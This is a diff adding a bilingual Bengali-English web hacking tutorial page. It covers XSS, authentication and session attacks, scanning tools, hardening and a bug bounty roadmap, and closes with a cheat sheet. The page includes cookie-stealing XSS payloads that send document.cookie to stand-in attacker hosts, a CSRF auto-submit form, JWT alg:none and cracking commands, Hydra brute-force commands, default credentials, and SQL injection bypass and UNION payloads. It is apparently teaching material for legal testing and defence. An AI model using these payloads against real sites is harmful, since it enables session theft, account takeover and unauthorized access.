+&lt;script&gt;fetch('https://attacker.com/?x='+btoa(document.cookie))&lt;/script&gt;
+    </div>
+
+    <h2 class="sec">XSS <span class="bn-text">দিয়ে কী করা যায়?</span><span class="en-text">What Can You Do with XSS?</span></h2>
+    <div class="grid2">
+      <div class="card danger-card">
+        <h4>💀 <span class="bn-text">আক্রমণ</span><span class="en-text">Attacks</span></h4>
+        <ul>
+          <li><span class="bn-text">Session cookie চুরি → Account hijack</span><span class="en-text">Session cookie theft → Account hijack</span></li>
+          <li>Keylogger (<span class="bn-text">password চুরি</span><span class="en-text">steal passwords</span>)</li>
+          <li>Phishing form (<span class="bn-text">fake login</span><span class="en-text">fake login</span>)</li>
+          <li>Webcam/Mic access (<span class="bn-text">permission থাকলে</span><span class="en-text">if permission granted</span>)</li>
+          <li>BeEF framework → Browser hook</li>
+          <li>CSRF attack (<span class="bn-text">victim-এর account দিয়ে</span><span class="en-text">using victim's account</span>)</li>
+        </ul>
+      </div>
+      <div class="card success-card">
+        <h4>🛡️ <span class="bn-text">প্রতিরোধ</span><span class="en-text">Prevention</span></h4>
+        <ul>
+          <li>Output Encoding (<code>htmlspecialchars()</code>)</li>
+          <li>Content Security Policy (CSP)</li>
+          <li>HttpOnly Cookie</li>
+          <li>Input Validation</li>
+          <li>DOMPurify library</li>
+          <li>X-XSS-Protection header</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📜 XSS <span class="bn-text">মনে রাখো</span><span class="en-text">Remember</span></h3>
+      <ul>
+        <li>✅ Stored XSS > Reflected XSS > DOM XSS (<span class="bn-text">বিপদের মাত্রায়</span><span class="en-text">in severity</span>)</li>
+        <li>✅ <span class="bn-text">প্রথমে <code>alert(1)</code> দিয়ে test করো</span><span class="en-text">Start testing with <code>alert(1)</code></span></li>
+        <li>✅ Cookie-তে HttpOnly না থাকলে → session চুরি করা যাবে</li>
+        <li>✅ <span class="bn-text">XSS Payloads list: PayloadAllTheThings GitHub</span><span class="en-text">XSS Payloads list: PayloadAllTheThings GitHub</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════ CH 06: AUTH ATTACKS ══════════════════ -->
+<div class="chapter ch-auth">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 06</div>
+    <div class="chapter-title">🔐 <span class="bn-text">Authentication ও Session Attack</span><span class="en-text">Authentication & Session Attacks</span></div>
+    <div class="chapter-desc"><span class="bn-text">Login bypass, session hijack, CSRF, JWT attack</span><span class="en-text">Login bypass, session hijack, CSRF, JWT attacks</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">Brute Force &amp; Credential Stuffing</h2>
+    <div class="code">
+<span class="c"># Hydra — HTTP Login Brute Force</span>
+hydra -l admin -P rockyou.txt target.com http-post-form \
+  "/login:username=^USER^&amp;password=^PASS^:Invalid credentials"
+
+<span class="c"># Hydra — HTTP Basic Auth</span>
+hydra -l admin -P rockyou.txt http-get://target.com/admin
+
+<span class="c"># FFUF — HTTP Brute Force (faster)</span>
+ffuf -u https://target.com/login -X POST \
+  -d "username=admin&amp;password=FUZZ" \
+  -w rockyou.txt -fc 401
+
+<span class="c"># Credential Stuffing — leaked password list</span>
+<span class="c"># Tool: Sniffer, Burp Intruder</span>
+
+<span class="c"># Default credentials চেক করো:</span>
+admin:admin, admin:password, admin:1234, root:root
+admin:admin123, test:test, guest:guest
+    </div>
+
+    <h2 class="sec">CSRF — Cross-Site Request Forgery</h2>
+    <div class="code">
+<span class="c"># Victim-এর browser দিয়ে request পাঠানো</span>
+
+<span class="c"># Example: Bank transfer</span>
+<span class="c"># Vulnerable endpoint:</span>
+POST /transfer
+amount=1000&amp;to_account=victim_account
+
+<span class="c"># CSRF attack: Attacker-এর website-এ:</span>
+&lt;form action="https://bank.com/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="amount" value="10000"&gt;
+  &lt;input type="hidden" name="to_account" value="attacker_account"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+
+<span class="c"># Victim যদি bank-এ login থাকে → transfer হয়ে যাবে!</span>
+
+<span class="c"># Image tag CSRF (GET request):</span>
+&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=10000"&gt;
+    </div>
+
+    <h2 class="sec">JWT Attack</h2>
+    <div class="code">
+<span class="c"># JWT structure: header.payload.signature</span>
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIG
+
+<span class="c"># Decode করো:</span>
+echo "eyJ1c2VyIjoiYWRtaW4ifQ==" | base64 -d
+<span class="g"># {"user":"admin"}</span>
+
+<span class="c"># ⭐ Attack 1: Algorithm None</span>
+<span class="c"># Header-এ alg: "none" দিলে signature verify হয় না</span>
+{"alg":"none","typ":"JWT"}
+{"user":"admin","role":"superadmin"}
+<span class="c"># Signature blank রাখো!</span>
+
+<span class="c"># ⭐ Attack 2: Weak Secret Brute Force</span>
+hashcat -a 0 -m 16500 jwt.txt rockyou.txt
+john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
+
+<span class="c"># ⭐ Attack 3: RS256 → HS256</span>
+<span class="c"># Public key দিয়ে HMAC sign করা</span>
+
+<span class="c"># Tool: jwt_tool</span>
+python3 jwt_tool.py TOKEN -X a     <span class="c"># alg:none attack</span>
+python3 jwt_tool.py TOKEN -C -d rockyou.txt  <span class="c"># crack</span>
+    </div>
+
+    <h2 class="sec">Session Hijacking &amp; Fixation</h2>
+    <div class="code">
+<span class="c"># Session Hijacking: Cookie চুরি করে অন্যের account</span>
+<span class="c"># XSS দিয়ে cookie চুরি:</span>
+&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;
+
+<span class="c"># তারপর cookie set করে access:</span>
+<span class="c"># Browser console-এ:</span>
+document.cookie = "session=STOLEN_SESSION_ID";
+
+<span class="c"># Session Fixation:</span>
+<span class="c"># Attacker known session ID দেয়:</span>
+https://target.com/login?session=FIXED_SESSION_ID
+<span class="c"># Victim login করলে → attacker সেই ID দিয়ে access পায়</span>
+
+<span class="c"># Password Reset Attack:</span>
+<span class="c"># Predictable token?</span>
+https://target.com/reset?token=123456    <span class="c"># Brute force!</span>
+https://target.com/reset?token=MD5(email+timestamp)  <span class="c"># Guessable!</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🔐 Auth Attack <span class="bn-text">মনে রাখো</span><span class="en-text">Remember</span></h3>
+      <ul>
+        <li>✅ CSRF token <span class="bn-text">না থাকলে → CSRF attack সম্ভব</span><span class="en-text">missing → CSRF attack possible</span></li>
+        <li>✅ JWT-তে <code>alg:none</code> <span class="bn-text">সবসময় test করো</span><span class="en-text">always test</span></li>
+        <li>✅ <span class="bn-text">Password reset token predictable কিনা দেখো</span><span class="en-text">Check if password reset token is predictable</span></li>
+        <li>✅ Rate limiting <span class="bn-text">না থাকলে → Brute force!</span><span class="en-text">missing → Brute force!</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════ CH 07: TOOLS ══════════════════ -->
+<div class="chapter ch-tools">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 07</div>
+    <div class="chapter-title">🔧 <span class="bn-text">Web Hacking টুলস</span><span class="en-text">Web Hacking Tools</span></div>
+    <div class="chapter-desc"><span class="bn-text">সেরা টুলগুলো কীভাবে ব্যবহার করবে</span><span class="en-text">How to use the best tools</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">Burp Suite — <span class="bn-text">সবচেয়ে গুরুত্বপূর্ণ টুল</span><span class="en-text">The Most Important Tool</span></h2>
+    <div class="box info">
+      <div class="box-t">💡 Burp Suite <span class="bn-text">কী?</span><span class="en-text">What is Burp Suite?</span></div>
+      <span class="bn-text">Burp Suite হলো একটি web security testing platform। এটি Browser ও Server-এর মাঝে proxy হিসেবে বসে সব request/response intercept, modify ও replay করতে পারে।</span>
+      <span class="en-text">Burp Suite is a web security testing platform. It sits as a proxy between the browser and server, intercepting, modifying, and replaying all requests/responses.</span>
+    </div>
+    <div class="code">
+<span class="c"># Setup:</span>
+<span class="c"># 1. Burp Suite চালু করো → Proxy → Listen on 127.0.0.1:8080</span>
+<span class="c"># 2. Browser proxy: 127.0.0.1:8080</span>
+<span class="c"># 3. http://burp → CA certificate install করো</span>
+
+<span class="c"># Intercept করা request-এ Right-click → Send to:</span>
+<span class="c">→ Repeater:   request বারবার পাঠাও, response দেখো</span>
+<span class="c">→ Intruder:   Brute force / fuzzing (parameter attack)</span>
+<span class="c">→ Scanner:    Automated vulnerability scan (Pro only)</span>
+<span class="c">→ Decoder:    Base64/URL encode/decode</span>
+<span class="c">→ Comparer:   দুটো response তুলনা করো</span>
+<span class="c">→ Sequencer:  Session token randomness check</span>
+
+<span class="c"># Intruder Attack Types:</span>
+<span class="c">Sniper:      এক position, এক wordlist</span>
+<span class="c">Battering ram: সব position, একই value</span>
+<span class="c">Pitchfork:   প্রতিটি position-এর আলাদা wordlist (credential stuffing)</span>
+<span class="c">Cluster bomb: সব combination (brute force)</span>
+    </div>
+
+    <h2 class="sec">Gobuster / FFUF — <span class="bn-text">Directory Bruteforce</span><span class="en-text">Directory Bruteforce</span></h2>
+    <div class="code">
+<span class="c"># Gobuster</span>
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
+gobuster dns -d target.com -w subdomains.txt    <span class="c"># Subdomain</span>
+gobuster vhost -u http://target.com -w vhosts.txt  <span class="c"># VHost</span>
+
+<span class="c"># FFUF — আরও শক্তিশালী</span>
+ffuf -u http://target.com/FUZZ -w wordlist.txt
+ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt
+ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404   <span class="c"># 404 বাদ</span>
+ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302
+
+<span class="c"># Subdomain fuzzing</span>
+ffuf -u http://FUZZ.target.com -w subdomains.txt -H "Host: FUZZ.target.com"
+
+<span class="c"># Parameter fuzzing</span>
+ffuf -u http://target.com/page?FUZZ=value -w params.txt
+    </div>
+
+    <h2 class="sec">Nikto — <span class="bn-text">Web Vulnerability Scanner</span><span class="en-text">Web Vulnerability Scanner</span></h2>
+    <div class="code">
+<span class="c"># Basic scan</span>
+nikto -h http://target.com
+
+<span class="c"># HTTPS</span>
+nikto -h https://target.com -ssl
+
+<span class="c"># Specific port</span>
+nikto -h target.com -port 8080
+
+<span class="c"># Output সেভ করো</span>
+nikto -h target.com -output nikto_report.txt
+
+<span class="c"># Nikto কী খোঁজে:</span>
+<span class="c">→ Outdated server software</span>
+<span class="c">→ Default files (robots.txt, .htaccess)</span>
+<span class="c">→ Dangerous HTTP methods (PUT, DELETE)</span>
+<span class="c">→ Missing security headers</span>
+<span class="c">→ XSS, SQLi basic checks</span>
+    </div>
+
+    <h2 class="sec">WhatWeb / Wappalyzer — <span class="bn-text">Technology Fingerprinting</span><span class="en-text">Technology Fingerprinting</span></h2>
+    <div class="code">
+<span class="c"># WhatWeb — CLI</span>
+whatweb target.com
+whatweb -v target.com    <span class="c"># Verbose</span>
+whatweb -a 3 target.com  <span class="c"># Aggression level</span>
+
+<span class="c"># Response থেকে technology বের করো:</span>
+curl -I http://target.com | grep -i "server\|x-powered-by\|x-generator"
+
+<span class="c"># Example output:</span>
+<span class="g">Server: Apache/2.4.29 (Ubuntu)</span>    <span class="c"># ← CVE search করো!</span>
+<span class="g">X-Powered-By: PHP/7.2.24</span>          <span class="c"># ← PHP vulnerability</span>
+<span class="g">X-Generator: WordPress 5.8</span>         <span class="c"># ← wpscan চালাও</span>
+
+<span class="c"># WPScan — WordPress</span>
+wpscan --url http://target.com
+wpscan --url http://target.com --enumerate u   <span class="c"># Users</span>
+wpscan --url http://target.com --enumerate p   <span class="c"># Plugins</span>
+wpscan --url http://target.com -P rockyou.txt -U admin  <span class="c"># BF</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🔧 <span class="bn-text">Tools মনে রাখো</span><span class="en-text">Tools to Remember</span></h3>
+      <ul>
+        <li>🎯 Burp Suite → <span class="bn-text">সব web attack-এর কেন্দ্র</span><span class="en-text">Center of all web attacks</span></li>
+        <li>🔍 Gobuster/FFUF → <span class="bn-text">hidden file ও directory</span><span class="en-text">Hidden files and directories</span></li>
+        <li>🔎 Nikto → <span class="bn-text">automated vulnerability scan</span><span class="en-text">Automated vulnerability scan</span></li>
+        <li>🏷️ WhatWeb → <span class="bn-text">technology stack জানো, তারপর CVE খোঁজো</span><span class="en-text">Know the tech stack, then search CVEs</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════ CH 08: DEFENSE ══════════════════ -->
+<div class="chapter ch-defense">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 08</div>
+    <div class="chapter-title">🛡️ Web Application <span class="bn-text">হার্ডেনিং</span><span class="en-text">Hardening</span></div>
+    <div class="chapter-desc"><span class="bn-text">Web application secure করার সম্পূর্ণ গাইড</span><span class="en-text">Complete guide to securing a web application</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">Security Headers — <span class="bn-text">সবচেয়ে সহজ সুরক্ষা</span><span class="en-text">Easiest Protection</span></h2>
+    <div class="code">
+<span class="c"># Apache-এ security headers (add করো .htaccess বা httpd.conf-এ)</span>
+
+<span class="c"># Clickjacking রোধ</span>
+Header always set X-Frame-Options "DENY"
+
+<span class="c"># MIME type sniffing রোধ</span>
+Header always set X-Content-Type-Options "nosniff"
+
+<span class="c"># XSS Protection</span>
+Header always set X-XSS-Protection "1; mode=block"
+
+<span class="c"># ⭐ HTTPS force (HSTS)</span>
+Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
+
+<span class="c"># ⭐ Content Security Policy (CSP) — XSS রোধে সেরা</span>
+Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'"
+
+<span class="c"># Referrer Policy</span>
+Header always set Referrer-Policy "strict-origin-when-cross-origin"
+
+<span class="c"># Permissions Policy</span>
+Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
+
+<span class="c"># Server info লুকাও</span>
+ServerTokens Prod
+ServerSignature Off
+    </div>
+
+    <h2 class="sec">Input Validation &amp; Output Encoding</h2>
+    <div class="code">
+<span class="c"># PHP — SQLi রোধ (Prepared Statement)</span>
+<span class="g">$stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt-&gt;execute([$username, $password]);</span>
+
+<span class="r"># ❌ ভুল (vulnerable):</span>
+<span class="r">$query = "SELECT * FROM users WHERE username = '$username'";</span>
+
+<span class="c"># PHP — XSS রোধ (Output Encoding)</span>
+<span class="g">echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');</span>
+
+<span class="c"># Python (Django) — Built-in protection</span>
+<span class="g"># Django ORM automatically uses parameterized queries
+User.objects.filter(username=username)  # Safe!
+# Templates auto-escape by default</span>
+
+<span class="c"># CSRF token (Django):</span>
+<span class="g">{% csrf_token %}  # Template-এ</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Security Checklist</span><span class="en-text">Security Checklist</span></h2>
+    <table>
+      <thead><tr>
+        <th><span class="bn-text">বিষয়</span><span class="en-text">Topic</span></th>
+        <th><span class="bn-text">কী করতে হবে</span><span class="en-text">What to Do</span></th>
+        <th><span class="bn-text">গুরুত্ব</span><span class="en-text">Importance</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td>SQL Injection</td><td>Prepared Statements, ORM</td><td><span class="sev-critical">CRITICAL</span></td></tr>
+        <tr><td>XSS</td><td>Output encoding, CSP, HttpOnly cookie</td><td><span class="sev-critical">CRITICAL</span></td></tr>
+        <tr><td>CSRF</td><td>CSRF token, SameSite cookie</td><td><span class="sev-high">HIGH</span></td></tr>
+        <tr><td>Authentication</td><td>Strong password, MFA, rate limiting</td><td><span class="sev-critical">CRITICAL</span></td></tr>
+        <tr><td>HTTPS</td><td>TLS 1.2+, HSTS header</td><td><span class="sev-critical">CRITICAL</span></td></tr>
+        <tr><td>Session</td><td>HttpOnly, Secure, SameSite, short expiry</td><td><span class="sev-high">HIGH</span></td></tr>
+        <tr><td>Access Control</td><td>Check authorization server-side</td><td><span class="sev-critical">CRITICAL</span></td></tr>
+        <tr><td>Error Handling</td><td>Generic errors, no stack trace</td><td><span class="sev-medium">MEDIUM</span></td></tr>
+        <tr><td>Dependencies</td><td>Update regularly, use Snyk/Dependabot</td><td><span class="sev-high">HIGH</span></td></tr>
+        <tr><td>Logging</td><td>Log all auth events, anomalies</td><td><span class="sev-medium">MEDIUM</span></td></tr>
+      </tbody>
+    </table>
+
+    <div class="chapter-summary">
+      <h3>🛡️ <span class="bn-text">Hardening সারসংক্ষেপ</span><span class="en-text">Hardening Summary</span></h3>
+      <ul>
+        <li>✅ <span class="bn-text">Prepared Statement — SQLi-র বিরুদ্ধে সেরা</span><span class="en-text">Prepared Statement — best against SQLi</span></li>
+        <li>✅ CSP Header — XSS <span class="bn-text">ব্লক করার সেরা উপায়</span><span class="en-text">best way to block XSS</span></li>
+        <li>✅ CSRF Token <span class="bn-text">সব POST request-এ</span><span class="en-text">on all POST requests</span></li>
+        <li>✅ HTTPS + HSTS — <span class="bn-text">সব সময় চালু রাখো</span><span class="en-text">always enable</span></li>
+        <li>✅ <span class="bn-text">Server-side access control — client কখনো trust করো না</span><span class="en-text">Server-side access control — never trust the client</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════ CH 09: ROADMAP ══════════════════ -->
+<div class="chapter ch-roadmap">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 09</div>
+    <div class="chapter-title">🗺️ Web Security Roadmap</div>
+    <div class="chapter-desc"><span class="bn-text">শূন্য থেকে Bug Bounty Hunter হওয়ার সম্পূর্ণ পথ</span><span class="en-text">Complete path from zero to Bug Bounty Hunter</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <div class="box info">
+      <div class="box-t">💡 <span class="bn-text">Bug Bounty কী?</span><span class="en-text">What is Bug Bounty?</span></div>
+      <span class="bn-text">Company-গুলো তাদের website-এ vulnerability খুঁজে দেওয়ার জন্য অর্থ পুরস্কার দেয়। HackerOne, Bugcrowd — এই platform-গুলোতে legal হ্যাকিং করে টাকা আয় করা যায়।</span>
+      <span class="en-text">Companies pay monetary rewards for finding vulnerabilities in their websites. On platforms like HackerOne and Bugcrowd, you can earn money through legal hacking.</span>
+    </div>
+
+    <div class="roadmap-container">
+
+      <div class="roadmap-phase">
+        <div class="phase-number" style="background:linear-gradient(135deg,#0077b6,#00b4d8);">1</div>
+        <div class="phase-content">
+          <div class="phase-title" style="color:#0077b6;">
+            🌐 <span class="bn-text">Phase 1 — Web ভিত্তি</span><span class="en-text">Phase 1 — Web Fundamentals</span>
+            <span class="badge badge-b" style="font-size:11px;margin-left:8px;">1-2 মাস</span>
+          </div>
+          <div class="phase-desc"><span class="bn-text">HTTP, HTML, JavaScript, Database — না জানলে web security বোঝা কঠিন।</span><span class="en-text">Without knowing HTTP, HTML, JavaScript, and databases, web security is hard to understand.</span></div>
+          <div class="phase-items">
+            <span class="phase-item" style="color:#0077b6;">HTTP Basics</span>
+            <span class="phase-item" style="color:#0077b6;">HTML/JS Basics</span>
+            <span class="phase-item" style="color:#0077b6;">SQL Basics</span>
+            <span class="phase-item" style="color:#0077b6;">Linux Command Line</span>
+            <span class="phase-item" style="color:#0077b6;">Browser DevTools</span>
+          </div>
+        </div>
+      </div>
+      <div class="roadmap-arrow">↓</div>
+
+      <div class="roadmap-phase">
+        <div class="phase-number" style="background:linear-gradient(135deg,#e63946,#c1121f);">2</div>
+        <div class="phase-content">
+          <div class="phase-title" style="color:#c1121f;">
+            💉 <span class="bn-text">Phase 2 — Core Vulnerabilities</span><span class="en-text">Phase 2 — Core Vulnerabilities</span>
+            <span class="badge badge-r" style="font-size:11px;margin-left:8px;">2-3 মাস</span>
+          </div>
+          <div class="phase-desc"><span class="bn-text">OWASP Top 10 হাতে-কলমে শেখো। PortSwigger Web Academy বিনামূল্যে।</span><span class="en-text">Learn OWASP Top 10 hands-on. PortSwigger Web Academy is free.</span></div>
+          <div class="phase-items">
+            <span class="phase-item" style="color:#c1121f;">SQL Injection</span>
+            <span class="phase-item" style="color:#c1121f;">XSS</span>
+            <span class="phase-item" style="color:#c1121f;">CSRF</span>
+            <span class="phase-item" style="color:#c1121f;">IDOR</span>
+            <span class="phase-item" style="color:#c1121f;">SSRF</span>
+            <span class="phase-item" style="color:#c1121f;">Auth Bypass</span>
+          </div>
+        </div>
+      </div>
+      <div class="roadmap-arrow">↓</div>
+
+      <div class="roadmap-phase">
+        <div class="phase-number" style="background:linear-gradient(135deg,#7b2d8b,#a855f7);">3</div>
+        <div class="phase-content">
+          <div class="phase-title" style="color:#7b2d8b;">
+            🔧 <span class="bn-text">Phase 3 — Tools Mastery</span><span class="en-text">Phase 3 — Tools Mastery</span>
+            <span class="badge badge-p" style="font-size:11px;margin-left:8px;">1-2 মাস</span>
+          </div>
+          <div class="phase-desc"><span class="bn-text">Burp Suite, SQLmap, Gobuster — এগুলো ছাড়া web hacking অসম্পূর্ণ।</span><span class="en-text">Without Burp Suite, SQLmap, and Gobuster, web hacking is incomplete.</span></div>
+          <div class="phase-items">
+            <span class="phase-item" style="color:#7b2d8b;">Burp Suite Pro</span>
+            <span class="phase-item" style="color:#7b2d8b;">SQLmap</span>
+            <span class="phase-item" style="color:#7b2d8b;">FFUF/Gobuster</span>
+            <span class="phase-item" style="color:#7b2d8b;">Nikto</span>
+            <span class="phase-item" style="color:#7b2d8b;">WPScan</span>
+            <span class="phase-item" style="color:#7b2d8b;">Nmap</span>
+          </div>
+        </div>
+      </div>
+      <div class="roadmap-arrow">↓</div>
+
+      <div class="roadmap-phase">
+        <div class="phase-number" style="background:linear-gradient(135deg,#2dc653,#06a94d);">4</div>
+        <div class="phase-content">
+          <div class="phase-title" style="color:#06a94d;">
+            🏋️ <span class="bn-text">Phase 4 — Practice (CTF & Labs)</span><span class="en-text">Phase 4 — Practice (CTF & Labs)</span>
+            <span class="badge badge-g" style="font-size:11px;margin-left:8px;">চলমান</span>
+          </div>
+          <div class="phase-desc"><span class="bn-text">শুধু পড়লে হবে না — হাতে-কলমে করতে হবে।</span><span class="en-text">Just reading won't work — you have to practice hands-on.</span></div>
+          <div class="phase-items">
+            <span class="phase-item" style="color:#06a94d;">PortSwigger Academy</span>
+            <span class="phase-item" style="color:#06a94d;">TryHackMe Web Path</span>
+            <span class="phase-item" style="color:#06a94d;">HackTheBox Web</span>
+            <span class="phase-item" style="color:#06a94d;">DVWA (local lab)</span>
+            <span class="phase-item" style="color:#06a94d;">PicoCTF Web</span>
+          </div>
+        </div>
+      </div>
+      <div class="roadmap-arrow">↓</div>
+
+      <div class="roadmap-phase">
+        <div class="phase-number" style="background:linear-gradient(135deg,#f4831f,#e63946);">5</div>
+        <div class="phase-content">
+          <div class="phase-title" style="color:#e63946;">
+            💰 <span class="bn-text">Phase 5 — Bug Bounty শুরু</span><span class="en-text">Phase 5 — Start Bug Bounty</span>
+            <span class="badge badge-r" style="font-size:11px;margin-left:8px;">চলমান</span>
+          </div>
+          <div class="phase-desc"><span class="bn-text">Real program-এ report করো। প্রথমে small scope, public program থেকে শুরু।</span><span class="en-text">Report to real programs. Start with small scope, public programs.</span></div>
+          <div class="phase-items">
+            <span class="phase-item" style="color:#e63946;">HackerOne</span>
+            <span class="phase-item" style="color:#e63946;">Bugcrowd</span>
+            <span class="phase-item" style="color:#e63946;">Intigriti</span>
+            <span class="phase-item" style="color:#e63946;">Write Reports</span>
+            <span class="phase-item" style="color:#e63946;">Hall of Fame</span>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <h2 class="sec">🏋️ <span class="bn-text">Practice Lab Setup</span><span class="en-text">Practice Lab Setup</span></h2>
+    <div class="code">
+<span class="c"># DVWA (Damn Vulnerable Web Application) — Local Lab</span>
+docker run -d -p 80:80 vulnerables/web-dvwa
+<span class="c"># → http://localhost/DVWA/</span>
+<span class="c"># Default: admin/password</span>
+
+<span class="c"># OWASP WebGoat — Complete course</span>
+docker run -d -p 8080:8080 webgoat/goat-and-wolf
+<span class="c"># → http://localhost:8080/WebGoat</span>
+
+<span class="c"># Juice Shop (OWASP) — Modern vulnerable app</span>
+docker run -d -p 3000:3000 bkimminich/juice-shop
+<span class="c"># → http://localhost:3000</span>
+
+<span class="c"># bWAPP — buggy web app</span>
+docker run -d -p 8025:80 raesene/bwapp
+<span class="c"># → http://localhost:8025/install.php</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🗺️ <span class="bn-text">Roadmap সারসংক্ষেপ</span><span class="en-text">Roadmap Summary</span></h3>
+      <ul>
+        <li>✅ Phase 1 → <span class="bn-text">HTML, HTTP, JS, SQL শেখো</span><span class="en-text">Learn HTML, HTTP, JS, SQL</span></li>
+        <li>✅ Phase 2 → OWASP Top 10 <span class="bn-text">সব শেখো</span><span class="en-text">Learn all of OWASP Top 10</span></li>
+        <li>✅ Phase 3 → Burp Suite <span class="bn-text">ভালো করে শেখো</span><span class="en-text">Learn Burp Suite well</span></li>
+        <li>✅ Phase 4 → PortSwigger Academy <span class="bn-text">সব lab complete করো</span><span class="en-text">Complete all labs</span></li>
+        <li>✅ Phase 5 → HackerOne <span class="bn-text">-এ প্রথম report করো</span><span class="en-text">Submit your first report on HackerOne</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════ CH 10: CHEAT SHEET ══════════════════ -->
+<div class="chapter ch-cheat">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 10</div>
+    <div class="chapter-title">📋 Quick Cheat Sheet — <span class="bn-text">দ্রুত রেফারেন্স</span><span class="en-text">Fast Reference</span></div>
+    <div class="chapter-desc"><span class="bn-text">সবচেয়ে বেশি ব্যবহৃত payload ও কমান্ড একনজরে</span><span class="en-text">Most frequently used payloads and commands at a glance</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">💉 SQL Injection <span class="bn-text">Payload</span><span class="en-text">Payloads</span></h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#4a0072;">🔑 Auth Bypass</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">admin'--</span><span class="cheat-desc"><span class="bn-text">সবচেয়ে সাধারণ</span><span class="en-text">Most common</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">' OR 1=1--</span><span class="cheat-desc"><span class="bn-text">Always true</span><span class="en-text">Always true</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">' OR '1'='1</span><span class="cheat-desc">String comparison</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">admin'#</span><span class="cheat-desc">MySQL comment</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">') OR ('1'='1</span><span class="cheat-desc">Parenthesis close</span></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#4a0072;">📊 UNION Attack</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">' ORDER BY 1--</span><span class="cheat-desc"><span class="bn-text">Column count</span><span class="en-text">Find column count</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">' UNION SELECT null--</span><span class="cheat-desc"><span class="bn-text">Null test</span><span class="en-text">Null test</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">' UNION SELECT 1,2,3--</span><span class="cheat-desc"><span class="bn-text">Position check</span><span class="en-text">Position check</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">' UNION SELECT user(),2--</span><span class="cheat-desc">DB user</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">' UNION SELECT @@version,2--</span><span class="cheat-desc">DB version</span></div>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec">📜 XSS Payloads</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#1a4731;">🧪 Basic Test</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">&lt;script&gt;alert(1)&lt;/script&gt;</span><span class="cheat-desc"><span class="bn-text">Basic</span><span class="en-text">Basic</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">&lt;img src=x onerror=alert(1)&gt;</span><span class="cheat-desc">Image error</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">&lt;svg onload=alert(1)&gt;</span><span class="cheat-desc">SVG</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">javascript:alert(1)</span><span class="cheat-desc">href XSS</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</span><span class="cheat-desc">Case bypass</span></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#1a4731;">🍪 Cookie Steal</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">&lt;script&gt;fetch('//x.com?c='+document.cookie)&lt;/script&gt;</span><span class="cheat-desc"><span class="bn-text">Fetch</span><span class="en-text">Using fetch</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">&lt;img src=x onerror="location='//x.com?c='+document.cookie"&gt;</span><span class="cheat-desc">Image</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">document.location='//x.com?c='+btoa(document.cookie)</span><span class="cheat-desc">Base64</span></div>
+        </div>
+      </div>
+    </div>
+
